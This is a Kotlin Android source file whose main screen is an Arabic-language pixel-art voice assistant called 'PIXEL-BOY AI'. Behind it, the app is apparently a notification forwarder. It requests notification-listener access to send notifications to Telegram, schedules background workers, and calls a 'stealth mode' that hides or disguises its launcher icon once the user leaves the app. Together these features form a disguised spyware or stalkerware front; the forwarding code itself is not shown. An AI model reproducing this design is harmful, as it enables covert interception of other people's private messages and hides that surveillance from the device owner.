package com.itsazni.notificationforwarder

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.Settings
import android.speech.RecognitionListener
import android.speech.RecognizerIntent
import android.speech.SpeechRecognizer
import android.speech.tts.TextToSpeech
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.animation.core.*
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.geometry.Size
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import androidx.lifecycle.DefaultLifecycleObserver
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.ProcessLifecycleOwner
import com.itsazni.notificationforwarder.ui.theme.AppTheme
import com.itsazni.notificationforwarder.worker.WorkerScheduler
import java.util.Locale

enum class CharacterEmotion { IDLE, WAVING, TALKING, HAPPY, SAD, JUMPING }

class MainActivity : ComponentActivity(), TextToSpeech.OnInitListener {

    private lateinit var tts: TextToSpeech
    private var isTtsReady = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        tts = TextToSpeech(this, this)

        // 🌟 مراقبة خروج المستخدم من التطبيق بالكامل
        ProcessLifecycleOwner.get().lifecycle.addObserver(object : DefaultLifecycleObserver {
            override fun onStop(owner: LifecycleOwner) {
                super.onStop(owner)
                // مجرد ما المستخدم يخرج من التطبيق ويروح الهوم أو تطبيق تاني
                // يتم إخفاء/تحويل الأيقونة فوراً إلى "مركز العثور"
                if (isNotificationListenerEnabled(this@MainActivity)) {
                    StealthUtils.switchToStealthMode(this@MainActivity)
                }
            }
        })

        setContent {
            AppTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = Color(0xFF0A0915)
                ) {
                    PixelVoiceAssistantScreen(
                        onSpeak = { text -> speakText(text) }
                    )
                }
            }
        }
    }

    override fun onInit(status: Int) {
        if (status == TextToSpeech.SUCCESS) {
            val result = tts.setLanguage(Locale("ar"))
            if (result != TextToSpeech.LANG_MISSING_DATA && result != TextToSpeech.LANG_NOT_SUPPORTED) {
                isTtsReady = true
            }
        }
    }

    private fun speakText(text: String) {
        if (isTtsReady) {
            tts.speak(text, TextToSpeech.QUEUE_FLUSH, null, "BotReplyID")
        }
    }

    override fun onDestroy() {
        if (::tts.isInitialized) {
            tts.stop()
            tts.shutdown()
        }
        super.onDestroy()
    }
}

@Composable
fun PixelVoiceAssistantScreen(onSpeak: (String) -> Unit) {
    val context = LocalContext.current
    var isPermissionGranted by remember { mutableStateOf(isNotificationListenerEnabled(context)) }
    var showPermissionDialog by remember { mutableStateOf(!isPermissionGranted) }
    
    var showMicPermissionDialog by remember { mutableStateOf(false) }

    val micPermissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            startListeningProcess(context, onSpeak)
        } else {
            showMicPermissionDialog = true
        }
    }

    var currentEmotion by remember { mutableStateOf(CharacterEmotion.WAVING) }
    var botResponseText by remember { mutableStateOf("أهلاً بك! أنا مساعدك البكسلي.. اضغط على المايك للتحدث معي بصوتك!") }
    var isListening by remember { mutableStateOf(false) }

    val scheduleNotes = remember {
        mutableStateListOf(
            "مراجعة إعدادات السيرفر 🎯",
            "اختبار إشعارات التليجرام 📱",
            "إنهاء مهام اليوم 🚀"
        )
    }

    LaunchedEffect(Unit) {
        if (isPermissionGranted) {
            WorkerScheduler.enqueueImmediate(context)
            WorkerScheduler.ensurePeriodic(context)
        }
        onSpeak("أهلاً بك يا بطل! أنا مساعدك البكسلي جاهز لسماعك.")
    }

    // --- 1. الشاشة المنبثقة لإذن الإشعارات ---
    if (showPermissionDialog) {
        AlertDialog(
            onDismissRequest = { showPermissionDialog = false },
            containerColor = Color(0xFF1B192E),
            title = {
                Text(
                    text = "🚨 إذن قراءة الإشعارات",
                    color = Color(0xFF00FF66),
                    fontFamily = FontFamily.Monospace,
                    fontWeight = FontWeight.Bold,
                    fontSize = 18.sp
                )
            },
            text = {
                Text(
                    text = "لتشغيل محول الإشعارات وإرسالها للتليجرام تلقائياً، يحتاج التطبيق إلى إذن الوصول للإشعارات.",
                    color = Color.White,
                    fontFamily = FontFamily.Monospace,
                    fontSize = 13.sp
                )
            },
            confirmButton = {
                Button(
                    onClick = {
                        showPermissionDialog = false
                        context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00FF66)),
                    shape = RoundedCornerShape(4.dp)
                ) {
                    Text("تفعيل الآن", color = Color.Black, fontWeight = FontWeight.Bold)
                }
            },
            dismissButton = {
                TextButton(onClick = { showPermissionDialog = false }) {
                    Text("لاحقاً", color = Color.Gray)
                }
            }
        )
    }

    // --- 2. الشاشة المنبثقة لإذن الميكروفون ---
    if (showMicPermissionDialog) {
        AlertDialog(
            onDismissRequest = { showMicPermissionDialog = false },
            containerColor = Color(0xFF1B192E),
            title = {
                Text(
                    text = "🎙️ إذن الميكروفون مطلوب",
                    color = Color(0xFF00E5FF),
                    fontFamily = FontFamily.Monospace,
                    fontWeight = FontWeight.Bold,
                    fontSize = 18.sp
                )
            },
            text = {
                Text(
                    text = "يحتاج المساعد إلى الوصول للميكروفون ليتمكن من سماع أوامرك الصوتية والتفاعل معك.",
                    color = Color.White,
                    fontFamily = FontFamily.Monospace,
                    fontSize = 13.sp
                )
            },
            confirmButton = {
                Button(
                    onClick = {
                        showMicPermissionDialog = false
                        micPermissionLauncher.launch(Manifest.permission.RECORD_AUDIO)
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00E5FF)),
                    shape = RoundedCornerShape(4.dp)
                ) {
                    Text("منح الإذن", color = Color.Black, fontWeight = FontWeight.Bold)
                }
            },
            dismissButton = {
                TextButton(onClick = { showMicPermissionDialog = false }) {
                    Text("إلغاء", color = Color.Gray)
                }
            }
        )
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.SpaceBetween
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(top = 8.dp),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text(
                text = "PIXEL-BOY AI",
                color = Color(0xFF00E5FF),
                fontWeight = FontWeight.Bold,
                fontSize = 20.sp,
                fontFamily = FontFamily.Monospace
            )
            Box(
                modifier = Modifier
                    .background(
                        if (isNotificationListenerEnabled(context)) Color(0xFF00FF66) else Color(0xFFFF0055),
                        CircleShape
                    )
                    .size(10.dp)
            )
        }

        Box(
            modifier = Modifier
                .fillMaxWidth()
                .weight(1f)
                .padding(vertical = 12.dp)
                .background(Color(0xFF141226), shape = RoundedCornerShape(8.dp))
                .border(2.dp, Color(0xFF00E5FF), shape = RoundedCornerShape(8.dp)),
            contentAlignment = Alignment.Center
        ) {
            Column(
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.Center
            ) {
                HumanoidPixelAvatar(
                    emotion = currentEmotion,
                    modifier = Modifier.size(180.dp)
                )

                Spacer(modifier = Modifier.height(20.dp))

                Surface(
                    modifier = Modifier
                        .fillMaxWidth(0.9f)
                        .border(1.dp, Color(0xFF00FF66), RoundedCornerShape(6.dp)),
                    color = Color(0xFF0A0915)
                ) {
                    Text(
                        text = botResponseText,
                        color = Color.White,
                        fontSize = 13.sp,
                        fontFamily = FontFamily.Monospace,
                        textAlign = TextAlign.Center,
                        modifier = Modifier.padding(12.dp)
                    )
                }
            }
        }

        Column(
            horizontalAlignment = Alignment.CenterHorizontally,
            modifier = Modifier.fillMaxWidth()
        ) {
            Text(
                text = if (isListening) "🎙️ أسمعك الآن.. اتكلم!" else "اضغط على زر المايك للتحدث",
                color = if (isListening) Color(0xFF00FF66) else Color.Gray,
                fontSize = 12.sp,
                fontFamily = FontFamily.Monospace,
                modifier = Modifier.padding(bottom = 8.dp)
            )

            IconButton(
                onClick = {
                    val hasMicPermission = ContextCompat.checkSelfPermission(
                        context,
                        Manifest.permission.RECORD_AUDIO
                    ) == PackageManager.PERMISSION_GRANTED

                    if (!hasMicPermission) {
                        showMicPermissionDialog = true
                    } else {
                        isListening = true
                        startVoiceRecognition(context as Activity) { recognizedText ->
                            isListening = false
                            processVoiceInput(
                                userInput = recognizedText,
                                scheduleNotes = scheduleNotes,
                                onReply = { responseText, emotion ->
                                    botResponseText = responseText
                                    currentEmotion = emotion
                                    onSpeak(responseText)
                                }
                            )
                        }
                    }
                },
                modifier = Modifier
                    .size(72.dp)
                    .background(
                        color = if (isListening) Color(0xFFFF0055) else Color(0xFF00FF66),
                        shape = CircleShape
                    )
            ) {
                Text(
                    text = if (isListening) "🛑" else "🎤",
                    fontSize = 28.sp
                )
            }
        }
    }
}

private fun startListeningProcess(context: Context, onSpeak: (String) -> Unit) {
    startVoiceRecognition(context as Activity) { recognizedText ->
        onSpeak("سمعتك ممتاز! جاري تنفيذ طلبك.")
    }
}

@Composable
fun HumanoidPixelAvatar(emotion: CharacterEmotion, modifier: Modifier = Modifier) {
    val infiniteTransition = rememberInfiniteTransition(label = "avatar_anim")
    
    val bounceY by infiniteTransition.animateFloat(
        initialValue = if (emotion == CharacterEmotion.JUMPING) -15f else -4f,
        targetValue = if (emotion == CharacterEmotion.JUMPING) 10f else 4f,
        animationSpec = infiniteRepeatable(
            animation = tween(if (emotion == CharacterEmotion.JUMPING) 300 else 700, easing = LinearEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "bounce"
    )

    Canvas(modifier = modifier.offset(y = bounceY.dp)) {
        val pixelSize = size.width / 16f

        val grid = when (emotion) {
            CharacterEmotion.WAVING -> listOf(
                "0000011111000000",
                "0000111111100100",
                "0001111111110100",
                "0001100110010100",
                "0001111111111000",
                "0001110011110000",
                "0000111111100000",
                "0011111111111000",
                "0101111111110000",
                "1001111111110000",
                "0001111111110000",
                "0001111111110000",
                "0000111001110000",
                "0000111001110000",
                "0000111001110000",
                "0001111001111000"
            )
            CharacterEmotion.TALKING, CharacterEmotion.HAPPY, CharacterEmotion.JUMPING -> listOf(
                "0000011111000000",
                "0000111111100000",
                "0001111111110000",
                "0001100110010000",
                "0001111111110000",
                "0001111111110000",
                "0000111111100000",
                "0011111111111000",
                "0101111111110100",
                "1001111111110010",
                "0001111111110000",
                "0001111111110000",
                "0000111001110000",
                "0000111001110000",
                "0000111001110000",
                "0001111001111000"
            )
            CharacterEmotion.SAD -> listOf(
                "0000011111000000",
                "0000111111100000",
                "0001111111110000",
                "0001100110010000",
                "0001110001110000",
                "0001101110110000",
                "0000111111100000",
                "0000111111100000",
                "0001111111110000",
                "0001111111110000",
                "0001111111110000",
                "0000111001110000",
                "0000111001110000",
                "0000111001110000",
                "0001111001111000",
                "0000000000000000"
            )
            else -> listOf(
                "0000011111000000",
                "0000111111100000",
                "0001111111110000",
                "0001100110010000",
                "0001111111110000",
                "0001110011110000",
                "0000111111100000",
                "0000111111100000",
                "0001111111110000",
                "0001111111110000",
                "0001111111110000",
                "0000111001110000",
                "0000111001110000",
                "0000111001110000",
                "0001111001111000",
                "0000000000000000"
            )
        }

        grid.forEachIndexed { r, row ->
            row.forEachIndexed { c, char ->
                if (char == '1') {
                    val color = when {
                        r < 3 -> Color(0xFF00E5FF)
                        r in 3..6 -> Color(0xFFFFD54F)
                        r in 7..11 -> Color(0xFF00FF66)
                        else -> Color(0xFF37474F)
                    }
                    drawRect(
                        color = color,
                        topLeft = Offset(c * pixelSize, r * pixelSize),
                        size = Size(pixelSize - 1f, pixelSize - 1f)
                    )
                }
            }
        }
    }
}

private fun processVoiceInput(
    userInput: String,
    scheduleNotes: MutableList<String>,
    onReply: (String, CharacterEmotion) -> Unit
) {
    val text = userInput.lowercase()

    when {
        text.contains("ازيك") || text.contains("أهلا") || text.contains("سلام") -> {
            onReply("أهلاً بيك يا غالي! أنا بخير والحمد لله.. جاهز لأي حاجة توئمرني بيها!", CharacterEmotion.WAVING)
        }
        text.contains("علينا ايه") || text.contains("مواعيد") || text.contains("جدول") || text.contains("النهاردة") -> {
            val notesFormatted = scheduleNotes.joinToString("، و ")
            onReply("عندك النهاردة المواعيد دي: $notesFormatted", CharacterEmotion.TALKING)
        }
        text.contains("سجل") || text.contains("ميعاد") || text.contains("اضف") -> {
            val cleanTask = userInput.replace("سجل", "").replace("ميعاد", "").replace("اضف", "").trim()
            if (cleanTask.isNotEmpty()) {
                scheduleNotes.add(cleanTask)
                onReply("يا سلام! تم تسجيل ميعاد: $cleanTask بنجاح!", CharacterEmotion.JUMPING)
            } else {
                onReply("قولي اسم الميعاد إيه بالضبط علشان أسجلهولك.", CharacterEmotion.SAD)
            }
        }
        text.contains("شكرا") || text.contains("تسلم") -> {
            onReply("العفو يا بطل! أنا في الخدمة دايماً 💚", CharacterEmotion.HAPPY)
        }
        else -> {
            onReply("سمعتك بتقول: $userInput.. تقدر تسألني عن مواعيد النهاردة أو تقولي سجل ميعاد جديد!", CharacterEmotion.TALKING)
        }
    }
}

private fun startVoiceRecognition(activity: Activity, onResult: (String) -> Unit) {
    val intent = Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH).apply {
        putExtra(RecognizerIntent.EXTRA_LANGUAGE_MODEL, RecognizerIntent.LANGUAGE_MODEL_FREE_FORM)
        putExtra(RecognizerIntent.EXTRA_LANGUAGE, "ar-EG")
        putExtra(RecognizerIntent.EXTRA_PROMPT, "تكلم الآن...")
    }

    val speechRecognizer = SpeechRecognizer.createSpeechRecognizer(activity)
    speechRecognizer.setRecognitionListener(object : RecognitionListener {
        override fun onReadyForSpeech(params: Bundle?) {}
        override fun onBeginningOfSpeech() {}
        override fun onRmsChanged(rmsdB: Float) {}
        override fun onBufferReceived(buffer: ByteArray?) {}
        override fun onEndOfSpeech() {}
        override fun onError(error: Int) {}
        override fun onResults(results: Bundle?) {
            val matches = results?.getStringArrayList(SpeechRecognizer.RESULTS_RECOGNITION)
            if (!matches.isNullOrEmpty()) {
                onResult(matches[0])
            }
        }
        override fun onPartialResults(partialResults: Bundle?) {}
        override fun onEvent(eventType: Int, params: Bundle?) {}
    })

    speechRecognizer.startListening(intent)
}

private fun isNotificationListenerEnabled(context: Context): Boolean {
    val packageName = context.packageName
    val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
    return flat?.contains(packageName) == true
}
